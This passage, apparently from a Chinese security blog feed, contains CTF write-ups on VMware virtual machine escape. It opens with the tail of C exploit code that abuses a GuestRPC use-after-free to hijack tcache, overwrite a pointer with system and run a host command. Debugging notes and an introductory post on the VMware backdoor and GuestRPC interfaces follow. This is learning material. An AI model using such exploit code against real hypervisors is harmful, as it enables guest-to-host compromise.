class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"already free check the heap\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"alloc for channel 1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak2 success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free agin for UAF\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"UAF done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ready to change fd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hjacking!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"target address in fd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay3<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pay4<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>pay4<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"text base :%p"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>把断点放在realloc的位置，方便查看realloc后的堆布局。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c15bb21f3a9a8d61cee8d1679228e3378e2a5c53.png" alt="图片.png"></p><p>在第一次free的位置看到了目标chunk，<code>0x7f797803a890</code>，这个chunk就是我们要复用的chunk。此次realloc结束，应该被挂进tcache。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5f6609f03fbf2c05e9a32233dda512666ac8401a.png" alt="图片.png"></p><p>整个chunk的内容，可以看到大小是0x115，这里不知道为啥，连地址都没对齐。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-558cbd15fff8d78e9d81193abbc1855318dc2976.png" alt="图片.png"></p><p>单步执行之后，看到被挂进tcache的chunk。当channel 1，alloc取出这块chunk的时候，没有触发到realloc，直接走过去了。所以没断下来。因该在if的判断位置加一个断点，查看堆布局的。</p><p>不过此时可以看一下目标chunk的内容，有没有被改变。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-af593aa4f5b88482d210904f17b6bbbdca1fff56.png" alt="图片.png"></p><p>可以看到被挂上了熟悉的fd，但是却没有在相应的tcache里面，则可以推断，该chunk已经是alloc状态了。</p><p>继续执行，第二次free。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf83f7ba2ba709b640e4e31c373f2f4ce8374f6e.png" alt="图片.png"></p><p>此次realloc依然触发free。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-90ca8fba0d3563f28628ce7e637ba491a0af2167.png" alt="图片.png"></p><p>chunk被挂进了tcache，然后下一步执行dnd_version应该会把chunk取出，然后把虚表指针写入。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3af68edeb6ac636b641ed4f28699a57cf02635d0.png" alt="图片.png"></p><p>成功写入，接下来就是改写system的过程。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fbcde0816cf86bb685d83ddcd650d26b20807683.png" alt="图片.png"><br> channel 0的第一次free，记住chunk地址，0x7fa59c028e20，然后和leak一眼，对channel 1的UAF。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5c0c0dd42f4ab7ab018faf0a5ff2962d73667f5.png" alt="图片.png"></p><p>劫持成功，但是此时tcache中却看不到，可能heapinfo有点问题。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-08e8e166fe38c1669ae4f225b82c46399d34c220.png" alt="图片.png"></p><p>计算偏移后，目标位置被打入tcache的fd中，然后就是常规利用。把该内存malloc出来。然后写入system</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-babc2811b8fd15b84ebcde28aab4e8a3ad4d017e.png" alt="图片.png"></p><p>成功写入system，继续执行，然后弹出计算器。<br> <img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b49b8f237dd3d59e57968a503942f5b52a884c87.png" alt="图片.png"></p><h2 id="0x05-思考"><a href="#0x05-思考" class="headerlink" title="0x05 思考"></a>0x05 思考</h2><p>emm，调试总是遇到一些问题，有时候挂上gdb，leak出来的基址就不对了。。。离谱，不知道为什么。想到的办法是，先发送完payload，然后再attach上去，exp和leak部分分开调试。</p><p>还有虚拟机的vmx，移动的时候，权限关系，可能导致打不开虚拟机，只有使用sudo  vmware才可以打开，不过这样打开的虚拟机，最后可以成功leak和执行，但是弹不出计算器，也就是命令执行失败，报错报了虚拟化错误，搞了好久没解决，最后也是莫名其妙的突然解决了。</p><p>两个vm类型的虚拟机逃逸收获很大，逆向的基础牢固了许多，realworld类的题目和CTF还是有很多差别，前者需要很好的逆向功底和对目标的熟悉，后者更多是技巧上的利用。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>realworld</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机逃逸（一）</title>
    <link href="/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于奇安信攻防社区 ： <a href="https://forum.butian.net/share/1666">https://forum.butian.net/share/1666</a></p></blockquote><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>虚拟化技术逐渐的开源和云计算的需要，使得虚拟化迅速发展，从KVM，XEN到qemu，docker…等，。</p><p>服务和软件定义网络的理念模糊了开发和运维的界限，也把更多的安全问题带入到虚拟化技术中。更多基础设施即服务（Iaas）管理平台的问题以及云供应商的不可控都给虚拟化技术的安全应用带来阻碍，而真正的虚拟化安全要从虚拟化技术本身谈起。</p><p>早期的虚拟化提出的是，宿主机和虚拟机之间的隔离，但是随着技术的发展，两机之间的通信让这种隔离变得模糊化，无论是FTP还是共享机制，都给安全带来的较大的挑战，本文针对虚拟机逃逸漏洞进行一个入门级别的分析。</p><h2 id="0x02-如何逃逸"><a href="#0x02-如何逃逸" class="headerlink" title="0x02 如何逃逸"></a>0x02 如何逃逸</h2><p><strong>首先，需要明确提权的模型</strong>，虚拟机逃逸的情况繁多，大致的模型和提权方式都类似。（后续的一些示例表示，非内核态也可以逃逸）</p><ul><li>虚拟机操作系统发送敏感请求，使操作系统陷入内核态</li><li>某些特权指令会进入ring0以下的状态，即交给<code>Hypervisor</code>处理</li><li>利用Hypervisor的脆弱性漏洞使得Hypervisor执行完特权指令后不产生指令状态的返回，使得执行完指令后依然停留在内核态</li><li>实现了提权后，可以渗透到Hypervisor和虚拟机的其他区域，破坏虚拟化的隔离机制，完成逃逸操作。</li></ul><p><strong>了解基本的流程之后，就是理解</strong>。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/11/55bab3ee7a10d74b.png" alt="img"><br> 以上是一个虚拟化的基本模型，这里使用的是一个全虚拟化的模型，VMM即hypervisor，提权利用的是特殊指令执行时候会陷入root mode。</p><p>这类指令的存在让提权和逃逸变得可行。总结以上流程，写出一个逃逸需要的基本条件。</p><ol><li>有漏洞的内核，即有可以执行使得陷入hypervisor的指令</li><li>有一次匹配的逃逸，理解为可以使得宿主机弹出一个计算器</li></ol><p>第二点的利用，在不同的虚拟化技术中，不一样，下面以VM ware的逃逸，做一个简单的例子。</p><h2 id="0x03-RWCTF2018-final-VMescape"><a href="#0x03-RWCTF2018-final-VMescape" class="headerlink" title="0x03 RWCTF2018 final VMescape"></a>0x03 RWCTF2018 final VMescape</h2><p>这题是RWCTF2018 final，做一个入手的题目非常的合适。</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>经常使用vmware虚拟机的人一定会熟悉其拖拽功能，即Guest和host之间的文件传递以及复制之类的操作，都是基于拖拽实现的，拖拽的背后是Guest和host之间的通信机制。而Vm类型的逃逸中，利用的就是该通信机制，这类机制被设计是现在了vmtools当中，高版本的vmware，vmtools消失，直接被自带安装。</p><h3 id="backdoor机制"><a href="#backdoor机制" class="headerlink" title="backdoor机制"></a>backdoor机制</h3><p>vmtools中有一个叫做backdoor的接口，该接口被用来实现通信。<a href="https://sites.google.com/site/chitchatvmback/backdoor">官方文档</a>,github中的开源文档也有<a href="https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/lib/backdoor/backdoorGcc64.c#L74-L104">open-vmtools</a>.</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span><span class="token function">Backdoor_InOut</span><span class="token punctuation">(</span>Backdoor_proto <span class="token operator">*</span>myBp<span class="token punctuation">)</span> <span class="token comment">// IN/OUT</span><span class="token punctuation">&#123;</span>   uint64 dummy<span class="token punctuation">;</span>   __asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>        <span class="token comment">/*         * Save %rbx on the stack because the Mac OS GCC doesn't want us to         * clobber it - it erroneously thinks %rbx is the PIC register.         * (Radar bug 7304232)         */</span>        <span class="token string">"pushq %%rbx"</span>           <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>        <span class="token string">"pushq %%rax"</span>           <span class="token string">"\n\t"</span>        <span class="token string">"movq 40(%%rax), %%rdi"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 32(%%rax), %%rsi"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 24(%%rax), %%rdx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 16(%%rax), %%rcx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq  8(%%rax), %%rbx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq   (%%rax), %%rax"</span> <span class="token string">"\n\t"</span>        <span class="token string">"inl %%dx, %%eax"</span>       <span class="token string">"\n\t"</span>  <span class="token comment">/* NB: There is no inq instruction */</span>        <span class="token string">"xchgq %%rax, (%%rsp)"</span>  <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rdi, 40(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rsi, 32(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rdx, 24(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rcx, 16(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rbx,  8(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"popq          (%%rax)"</span> <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>        <span class="token string">"popq %%rbx"</span>            <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>其中有一条特权指令，<code>in</code>，这条指令在正常的操作系统执行会报错，但是在vm中的guest机器执行这条指令，这个异常会被 vmtools捕获，然后传递给<code>vmware-vmx.exe</code>进行通信操作。</p><p><strong>重点在于，backdoor普通用户也可以执行</strong>，所以，guest中，执行相应的代码，让操作系统陷入hypervisor层，然后再利用backdoor和host进行通信，触发此bug。</p><p>通信所需要的函数，再open-vmtools中也有实现。<code>Message_Send</code>和<code>Message_Recv</code>。<a href="https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/lib/message/message.c">git链接</a>。</p><p>在某一篇<a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">文档</a>中，给出了该操作的基本使用.</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">unsigned</span> <span class="token function">__declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">GetMousePos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __asm    <span class="token punctuation">&#123;</span>        mov eax<span class="token punctuation">,</span> <span class="token number">564</span>D5868h        mov ecx<span class="token punctuation">,</span> <span class="token number">4</span>        mov edx<span class="token punctuation">,</span> <span class="token number">5658</span>h        in eax<span class="token punctuation">,</span> dx        ret    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> mousepos <span class="token operator">=</span> <span class="token function">GetMousePos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"鼠标光标位置：x=%d,y=%d\n"</span> <span class="token punctuation">,</span> mousepos <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">,</span> mousepos <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><blockquote><p>If this program is executed on a real machine, the in instruction  will cause a “privileged instruction” exception, as user-mode code runs  in Ring 3. However, when this program is executed on the virtual  machine, it will print the correct mouse cursor position.</p><p>在真机上会报错，而在虚拟机中，将获得鼠标位置。</p></blockquote><h3 id="GuestRPC-Drag-and-Drop-RPCI"><a href="#GuestRPC-Drag-and-Drop-RPCI" class="headerlink" title="GuestRPC | Drag and Drop RPCI"></a>GuestRPC | Drag and Drop RPCI</h3><p>这是在backdoor基础上实现的更为灵活的通信方式。单个 GuestRPC 调用由一系列请求组成：</p><ul><li>打开 GuestRPC 通道</li><li>发送命令长度</li><li>发送命令数据</li><li>接收回复大小</li><li>接收回复数据</li><li>发出接收结束信号</li><li>关闭频道</li></ul><p>具体的函数实现后面再去分析，这里实际上是实现了一套不那么底层的通信机制。依靠这个机制，guest和host之间可以实现许多有意思的操作，例如：dnd（Drag n Drop）、cp（Copy Paste）操作、发送或获取信息等。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/11/3a60818ae9d00e21.png" alt="img"></p><p>再&#x2F;lib&#x2F;include&#x2F;rpcout.h中定义了相关的一些函数，这些函数用来构建和摧毁rpc通道。</p><p>最后的调用追踪如下。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">Rpcout_start<span class="token operator">-></span>Message_OpenAllocated<span class="token operator">-></span>Backdoor<span class="token punctuation">;</span>RpcOut_send<span class="token operator">-></span>Message_Send  <span class="token operator">&amp;</span> Message_Receive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>这几处函数调用对backdoor的操作都是基于一个结构体。<code>Backdoor_proto</code></p><p>在<code>backdoor_types.h</code>中对其有定义。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DECLARE_REG64_STRUCT</span> <span class="token punctuation">\</span>   <span class="token expression">DECLARE_REG32_STRUCT<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression"><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> </span><span class="token punctuation">\</span>      <span class="token expression">uint32 low<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>      <span class="token expression">uint32 high<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression"><span class="token punctuation">&#125;</span> 